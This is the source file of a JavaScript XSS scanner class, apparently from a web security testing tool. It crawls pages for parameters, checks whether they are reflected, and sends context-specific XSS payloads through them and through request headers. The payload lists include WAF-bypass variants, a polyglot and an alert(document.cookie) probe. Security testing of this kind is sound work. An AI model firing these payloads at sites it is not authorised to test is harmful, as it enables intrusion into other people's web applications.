import { httpGet, httpPost, httpRequest } from '../../utils/http-client.js';
import { URLParser } from '../input/url-parser.js';
import { RateLimiter } from '../../utils/rate-limiter.js';
import { generateId, urlEncode } from '../../utils/helpers.js';
import logger from '../../utils/logger.js';

/**
 * XSS Scanner - Reflected, Stored, and DOM-based XSS detection
 */
export class XSSScanner {
  constructor(options = {}) {
    this.rateLimiter = new RateLimiter(options.rateLimit || 10, options.concurrent || 5);
    this.timeout = options.timeout || 10000;
    this.results = [];
    this.payloads = this._getPayloads();
  }

  /**
   * Full XSS scan on URL
   */
  async scan(url, options = {}) {
    logger.info(`[XSS] Scanning: ${url}`);
    const findings = [];

    const parsed = URLParser.parse(url);
    if (!parsed) return findings;

    // Get parameters from URL
    const params = { ...parsed.params };

    // Also discover parameters from the page
    if (options.crawl !== false) {
      const discovered = await this._discoverParams(url);
      Object.assign(params, discovered);
    }

    if (Object.keys(params).length === 0) {
      logger.debug(`[XSS] No parameters found for ${url}`);
      return findings;
    }

    logger.info(`[XSS] Testing ${Object.keys(params).length} parameters...`);

    // Test each parameter
    for (const [param, originalValue] of Object.entries(params)) {
      const result = await this._testParameter(url, param, originalValue, options);
      if (result) {
        findings.push(result);
        logger.vuln(result.severity, `[XSS] ${result.type} in ${param} @ ${url}`);
      }
    }

    // Test headers (Referer, User-Agent, etc.)
    if (options.testHeaders !== false) {
      const headerResults = await this._testHeaders(url);
      findings.push(...headerResults);
    }

    this.results.push(...findings);
    return findings;
  }

  /**
   * Test a single parameter for XSS
   */
  async _testParameter(url, param, originalValue, options = {}) {
    // Step 1: Check if parameter is reflected
    const marker = `recon${Math.random().toString(36).substring(2, 8)}`;
    const reflectionCheck = await this._checkReflection(url, param, marker);

    if (!reflectionCheck.reflected) return null;

    // Step 2: Determine context
    const context = this._determineContext(reflectionCheck.html, marker);

    // Step 3: Generate context-aware payloads
    const payloads = this._getPayloadsForContext(context);

    // Step 4: Test payloads
    for (const payload of payloads) {
      const result = await this._testPayload(url, param, payload, context);
      if (result) {
        return {
          id: generateId('XSS'),
          type: 'reflected-xss',
          severity: 'medium',
          url,
          parameter: param,
          payload: payload.value,
          context,
          evidence: result.evidence,
          request: result.request,
          response: result.response,
          confidence: result.confidence,
          timestamp: new Date().toISOString(),
        };
      }
    }

    return null;
  }

  /**
   * Check if value is reflected in response
   */
  async _checkReflection(url, param, value) {
    const testUrl = URLParser.buildUrl(url.split('?')[0], { [param]: value });
    const response = await httpGet(testUrl, { timeout: this.timeout });
    const html = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');

    return {
      reflected: html.includes(value),
      html,
      status: response.status,
    };
  }

  /**
   * Determine injection context
   */
  _determineContext(html, marker) {
    const idx = html.indexOf(marker);
    if (idx === -1) return 'none';

    const before = html.substring(Math.max(0, idx - 100), idx);
    const after = html.substring(idx + marker.length, idx + marker.length + 100);

    // Inside HTML tag attribute
    if (before.match(/=["'][^"']*$/) || before.match(/=\s*$/)) {
      if (before.match(/href\s*=\s*["']?$/i)) return 'attribute-href';
      if (before.match(/src\s*=\s*["']?$/i)) return 'attribute-src';
      if (before.match(/on\w+\s*=\s*["']?$/i)) return 'attribute-event';
      return 'attribute';
    }

    // Inside script tag
    if (before.match(/<script[^>]*>[^<]*$/i)) return 'javascript';

    // Inside style tag
    if (before.match(/<style[^>]*>[^<]*$/i)) return 'css';

    // Inside HTML comment
    if (before.match(/<!--[^>]*$/)) return 'comment';

    // Inside tag (between < and >)
    if (before.match(/<[^>]*$/) && after.match(/^[^<]*>/)) return 'tag';

    // Default: HTML body
    return 'html';
  }

  /**
   * Get payloads for specific context
   */
  _getPayloadsForContext(context) {
    const payloads = {
      html: [
        { value: '<script>alert(1)</script>', type: 'basic' },
        { value: '<img src=x onerror=alert(1)>', type: 'img-error' },
        { value: '<svg onload=alert(1)>', type: 'svg' },
        { value: '<svg/onload=alert(1)>', type: 'svg-nospace' },
        { value: '<details open ontoggle=alert(1)>', type: 'details' },
        { value: '<body onload=alert(1)>', type: 'body' },
        { value: '<marquee onstart=alert(1)>', type: 'marquee' },
        { value: '<video src=x onerror=alert(1)>', type: 'video' },
        { value: '<input onfocus=alert(1) autofocus>', type: 'input-focus' },
        { value: '<iframe src="javascript:alert(1)">', type: 'iframe' },
      ],
      attribute: [
        { value: '"><script>alert(1)</script>', type: 'break-attr' },
        { value: "' onmouseover='alert(1)", type: 'event-single' },
        { value: '" onmouseover="alert(1)', type: 'event-double' },
        { value: '" onfocus="alert(1)" autofocus="', type: 'focus' },
        { value: "' onfocus='alert(1)' autofocus='", type: 'focus-single' },
        { value: '"><img src=x onerror=alert(1)>', type: 'break-img' },
        { value: "'/><svg onload=alert(1)>", type: 'break-svg' },
      ],
      'attribute-href': [
        { value: 'javascript:alert(1)', type: 'js-proto' },
        { value: 'data:text/html,<script>alert(1)</script>', type: 'data-uri' },
        { value: 'javascript:alert(document.domain)', type: 'js-domain' },
      ],
      'attribute-src': [
        { value: 'javascript:alert(1)', type: 'js-proto' },
        { value: 'x" onerror="alert(1)', type: 'break-src' },
      ],
      'attribute-event': [
        { value: 'alert(1)', type: 'direct' },
        { value: 'alert(document.domain)', type: 'domain' },
        { value: 'alert(document.cookie)', type: 'cookie' },
      ],
      javascript: [
        { value: "';alert(1);//", type: 'break-string-single' },
        { value: '";alert(1);//', type: 'break-string-double' },
        { value: '</script><script>alert(1)</script>', type: 'break-script' },
        { value: '-alert(1)-', type: 'arithmetic' },
        { value: '${alert(1)}', type: 'template-literal' },
      ],
      comment: [
        { value: '--><script>alert(1)</script><!--', type: 'break-comment' },
        { value: '--><img src=x onerror=alert(1)><!--', type: 'break-comment-img' },
      ],
      tag: [
        { value: ' onmouseover=alert(1) ', type: 'inject-event' },
        { value: ' onfocus=alert(1) autofocus ', type: 'inject-focus' },
        { value: '><script>alert(1)</script>', type: 'break-tag' },
      ],
    };

    return payloads[context] || payloads.html;
  }

  /**
   * Test a specific payload
   */
  async _testPayload(url, param, payload, context) {
    try {
      const baseUrl = url.split('?')[0];
      const parsed = URLParser.parse(url);
      const params = { ...parsed.params, [param]: payload.value };
      const testUrl = URLParser.buildUrl(baseUrl, params);

      const response = await httpGet(testUrl, { timeout: this.timeout });
      const html = typeof response.data === 'string' ? response.data : '';

      // Check if payload is reflected unencoded
      if (html.includes(payload.value)) {
        // Verify it's actually executable (not inside encoded context)
        if (this._isExecutable(html, payload.value)) {
          return {
            evidence: `Payload reflected unencoded in ${context} context`,
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status} - Payload found in response body`,
            confidence: 90,
          };
        }
      }

      // Check partial reflection (some chars might be filtered)
      const criticalParts = this._getCriticalParts(payload.value);
      if (criticalParts.every(part => html.includes(part))) {
        return {
          evidence: `Critical payload parts reflected in ${context} context`,
          request: `GET ${testUrl}`,
          response: `HTTP ${response.status} - Partial payload reflection detected`,
          confidence: 70,
        };
      }
    } catch { /* skip */ }

    return null;
  }

  /**
   * Check if reflected payload is in executable position
   */
  _isExecutable(html, payload) {
    const idx = html.indexOf(payload);
    if (idx === -1) return false;

    const before = html.substring(Math.max(0, idx - 200), idx);

    // Not executable if inside textarea, title, or noscript
    if (before.match(/<(textarea|title|noscript|style)[^>]*>[^<]*$/i)) return false;

    // Not executable if HTML-encoded
    if (html.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) return false;

    return true;
  }

  /**
   * Get critical parts of payload that indicate XSS
   */
  _getCriticalParts(payload) {
    if (payload.includes('<script>')) return ['<script>', '</script>'];
    if (payload.includes('onerror=')) return ['onerror=', 'alert('];
    if (payload.includes('onload=')) return ['onload=', 'alert('];
    if (payload.includes('onmouseover=')) return ['onmouseover=', 'alert('];
    if (payload.includes('onfocus=')) return ['onfocus=', 'alert('];
    return [payload];
  }

  /**
   * Test HTTP headers for XSS
   */
  async _testHeaders(url) {
    const findings = [];
    const headersToTest = ['Referer', 'User-Agent', 'X-Forwarded-For'];
    const payload = '<script>alert(1)</script>';

    for (const header of headersToTest) {
      try {
        const response = await httpRequest('GET', url, {
          headers: { [header]: payload },
          timeout: this.timeout,
        });
        const html = typeof response.data === 'string' ? response.data : '';

        if (html.includes(payload)) {
          findings.push({
            id: generateId('XSS'),
            type: 'reflected-xss-header',
            severity: 'medium',
            url,
            parameter: `Header: ${header}`,
            payload,
            context: 'header-injection',
            evidence: `Payload in ${header} header reflected in response`,
            confidence: 85,
            timestamp: new Date().toISOString(),
          });
          logger.vuln('medium', `[XSS] Header injection via ${header} @ ${url}`);
        }
      } catch { /* skip */ }
    }

    return findings;
  }

  /**
   * Discover parameters from page
   */
  async _discoverParams(url) {
    const params = {};
    try {
      const response = await httpGet(url, { timeout: this.timeout });
      const html = typeof response.data === 'string' ? response.data : '';

      // Extract from forms
      const inputMatches = html.matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*/gi);
      for (const match of inputMatches) {
        params[match[1]] = 'test';
      }

      // Extract from URL parameters in links
      const hrefMatches = html.matchAll(/href=["'][^"']*\?([^"'#]+)["']/gi);
      for (const match of hrefMatches) {
        const urlParams = new URLSearchParams(match[1]);
        for (const [key] of urlParams) {
          params[key] = 'test';
        }
      }
    } catch { /* skip */ }

    return params;
  }

  /**
   * Get all payloads
   */
  _getPayloads() {
    return {
      basic: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
      ],
      wafBypass: [
        '<img src=x onerror=alert`1`>',
        '<svg/onload=confirm(1)>',
        '<details/open/ontoggle=alert(1)>',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '"><img src=x onerror=alert(1)>',
        '<sVg/oNloAd=alert(1)>',
      ],
      polyglot: [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
        '"><svg/onload=alert(1)//',
      ],
    };
  }
}

export default XSSScanner;
